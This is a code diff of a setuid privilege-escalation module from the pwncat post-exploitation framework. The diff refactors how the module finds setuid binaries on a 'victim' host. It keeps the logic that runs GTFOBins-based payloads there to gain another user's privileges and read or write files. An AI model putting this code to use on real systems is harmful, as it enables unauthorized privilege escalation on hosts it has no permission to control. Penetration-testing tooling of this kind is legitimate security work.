@@ -1,85 +1,49 @@
 #!/usr/bin/env python3
-from typing import Generator, List, BinaryIO
-import shlex
-import sys
-from time import sleep
 import os
-from colorama import Fore, Style
-import io
+from typing import List, BinaryIO
+
+from colorama import Fore
 
 import pwncat
-from pwncat.privesc.base import Method, PrivescError, Technique
-from pwncat.gtfobins import Binary, Stream, Capability, MethodWrapper, BinaryNotFound
-from pwncat.file import RemoteBinaryPipe
 from pwncat import util
+from pwncat.gtfobins import Stream, Capability, BinaryNotFound
+from pwncat.privesc import BaseMethod, Technique, PrivescError
 
 
-class SetuidMethod(Method):
+class Method(BaseMethod):
 
     name = "setuid"
-    BINARIES = ["find", "stat"]
-
-    def __init__(self, pty: "pwncat.pty.PtyHandler"):
-        super(SetuidMethod, self).__init__(pty)
-
-        self.users_searched = []
-        self.suid_paths = {}
-
-    def find_suid(self):
-
-        current_user: "pwncat.db.User" = pwncat.victim.current_user
-
-        # We've already searched for SUID binaries as this user
-        if len(current_user.suid):
-            return
-
-        # Spawn a find command to locate the setuid binaries
-        files = []
-        with pwncat.victim.subprocess(
-            "find / -perm -4000 -print 2>/dev/null", mode="r", no_job=True
-        ) as stream:
-            util.progress("searching for setuid binaries")
-            for path in stream:
-                path = path.strip().decode("utf-8")
-                util.progress(
-                    (
-                        f"searching for setuid binaries as {Fore.GREEN}{current_user.name}{Fore.RESET}: "
-                        f"{Fore.CYAN}{os.path.basename(path)}{Fore.RESET}"
-                    )
-                )
-                files.append(path)
-
-        util.success("searching for setuid binaries: complete", overlay=True)
-
-        with pwncat.victim.subprocess(
-            f"stat -c '%U' {' '.join(files)}", mode="r", no_job=True
-        ) as stream:
-            for file, user in zip(files, stream):
-                user = user.strip().decode("utf-8")
-                binary = pwncat.db.SUID(path=file,)
-                pwncat.victim.host.suid.append(binary)
-                pwncat.victim.users[user].owned_suid.append(binary)
-                current_user.suid.append(binary)
-
-        pwncat.victim.session.commit()
+    BINARIES = ["find"]
 
     def enumerate(self, caps: Capability = Capability.ALL) -> List[Technique]:
         """ Find all techniques known at this time """
 
         # Update the cache for the current user
-        self.find_suid()
+        # self.find_suid()
 
         known_techniques = []
-        for suid in pwncat.victim.host.suid:
-            try:
-                binary = pwncat.victim.gtfo.find_binary(suid.path, caps)
-            except BinaryNotFound:
-                continue
+        try:
+            for suid in pwncat.victim.enumerate.iter("suid"):
 
-            for method in binary.iter_methods(suid.path, caps, Stream.ANY):
-                known_techniques.append(
-                    Technique(suid.owner.name, self, method, method.cap)
+                # Print status message
+                util.progress(
+                    (
+                        f"enumerating suid binaries: "
+                        f"{Fore.CYAN}{os.path.basename(suid.data.path)}{Fore.RESET}"
+                    )
                 )
+
+                try:
+                    binary = pwncat.victim.gtfo.find_binary(suid.data.path, caps)
+                except BinaryNotFound:
+                    continue
+
+                for method in binary.iter_methods(suid.data.path, caps, Stream.ANY):
+                    known_techniques.append(
+                        Technique(suid.data.owner.name, self, method, method.cap,)
+                    )
+        finally:
+            util.erase_progress()
 
         return known_techniques
 
@@ -94,13 +58,13 @@ class SetuidMethod(Method):
         )
 
         # Run the start commands
-        # pwncat.victim.process(payload, delim=False)
         pwncat.victim.run(payload, wait=False)
 
         # Send required input
         pwncat.victim.client.send(input_data.encode("utf-8"))
 
-        return exit_cmd  # remember how to close out of this privesc
+        # remember how to close out of this privesc
+        return exit_cmd
 
     def read_file(self, filepath: str, technique: Technique) -> BinaryIO:
 
@@ -137,6 +101,17 @@ class SetuidMethod(Method):
         mode = "w"
         if method.stream is Stream.RAW:
             mode += "b"
+
+        try:
+            # data_printable = data.decode("utf-8").isprintable()
+            # Use the custom `util.isprintable()` so we can keep newlines
+            data_printable = util.isprintable(data)
+
+        except UnicodeDecodeError:
+            data_printable = False
+
+        if method.stream == Stream.PRINT and not data_printable:
+            raise PrivescError(f"{technique}: input data not printable")
 
         # Send the read payload
         pipe = pwncat.victim.subprocess(
